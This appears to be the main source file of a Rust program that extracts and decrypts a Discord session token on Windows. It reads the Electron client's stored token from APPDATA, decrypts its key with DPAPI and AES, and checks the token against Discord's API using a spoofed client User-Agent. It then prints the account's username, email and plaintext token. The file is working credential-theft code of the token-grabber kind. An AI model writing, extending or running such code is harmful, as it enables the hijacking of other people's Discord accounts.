mod decrypt_token;
mod electron_extract;
mod error;
mod string_key;

use error::ExtractDiscordTokenError;
use serde_json::Value;
use std::env;
use std::path::Path;

const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36";
const ENDPOINT_URL: &str = "https://discord.com/api/v9/users/@me";

fn main() -> Result<(), ExtractDiscordTokenError> {
    let appdata_path_str = env::var("APPDATA")?;
    let appdata_dir = Path::new(&appdata_path_str);

    let temp_path_str = env::var("TEMP")?;
    let temp_dir = Path::new(&temp_path_str);

    let mut token_buf = electron_extract::extract_encrypted_token(appdata_dir, temp_dir)?;
    let decrypted_key =
        decrypt_token::win32_decrypt(&mut electron_extract::extract_encrypted_key(appdata_dir)?)?;
    let decrypted_token = decrypt_token::aead_decrypt_inplace(&mut token_buf, &decrypted_key)?;

    let req = ureq::get(ENDPOINT_URL)
        .set("User-Agent", USER_AGENT)
        .set("Authorization", decrypted_token);
    if let Some(json_response) = req
        .call()
        .ok()
        .and_then(|resp| resp.into_json::<Value>().ok())
    {
        let username_val = json_response
            .get("username")
            .and_then(|value| value.as_str());
        let discriminator_val = json_response
            .get("discriminator")
            .and_then(|value| value.as_str());
        if let (Some(username), Some(discriminator)) = (username_val, discriminator_val) {
            println!("Username: {}#{}", username, discriminator);
        }

        if let Some(email) = json_response.get("email").and_then(|value| value.as_str()) {
            println!("Email: {}", email);
        }
    }

    println!("Session token: {}", decrypted_token);

    Ok(())
}
